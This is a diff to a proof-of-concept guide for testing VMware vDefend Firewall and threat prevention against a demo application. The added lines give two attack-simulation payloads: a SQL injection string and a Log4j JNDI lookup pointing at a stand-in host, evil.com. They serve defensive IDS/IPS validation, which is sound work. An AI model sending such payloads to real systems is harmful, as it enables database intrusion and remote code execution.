@@ -1,7 +1,7 @@
 # VMware vDefend: Evaluation & Testing Guide
 **Target Environment:** CommunitySafe 3-Tier Demo Application
 
-This guide outlines a structured Proof of Concept (POC) plan to evaluate **VMware vDefend Firewall** and **Advanced Threat Prevention (ATP)**.
+This guide outlines a structured Proof of Concept (POC) plan to evaluate **VMware vDefend Firewall** and **Advanced Threat Prevention (ATP)**. It uses the *CommunitySafe* demo application to generate legitimate traffic, lateral movement, and malicious attack signatures on demand.
 
 ---
 
@@ -19,7 +19,9 @@ This guide outlines a structured Proof of Concept (POC) plan to evaluate **VMwar
 
 1.  **Attack:** Go to **Testing** tab -> **Attack Simulation**.
 2.  **Test A (SQLi):** Click **"SQL Injection"**.
+    * *Payload Sent:* `?id=' OR 1=1 --`
 3.  **Test B (RCE):** Click **"Log4j / RCE Attack"**.
+    * *Payload Sent:* `${jndi:ldap://evil.com/x}`
 4.  **Validation:** Check **NSX Manager -> Security -> IDS/IPS Events**. Look for `ET WEB_SPECIFIC_APPS` or `Apache Log4j`.
 
 ### Scenario 3: Malware Prevention
